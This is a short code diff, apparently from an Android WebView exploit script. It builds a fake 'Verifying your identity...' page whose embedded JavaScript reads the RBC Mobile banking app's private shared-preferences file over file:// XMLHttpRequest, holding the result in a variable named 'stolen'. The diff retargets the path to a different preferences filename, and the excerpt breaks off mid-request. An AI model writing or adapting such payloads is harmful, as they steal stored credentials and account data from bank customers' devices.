@@ -35,7 +35,7 @@ if (typeof WebViewFragment === "undefined") {
     try {
         var testHtml = '<html><body><p>Verifying your identity...</p><script>' +
             'var stolen = "placeholder";' +
-            'var target = "/data/data/com.rbc.mobile.android/shared_prefs/SecurePrefs.xml";' +
+            'var target = "/data/data/com.rbc.mobile.android/shared_prefs/RBC Mobile.xml";' +
             'var xhr = new XMLHttpRequest();' +
             'xhr.open("GET", "file://" + target, true);' +
             'xhr.onreadystatechange = function() {' +
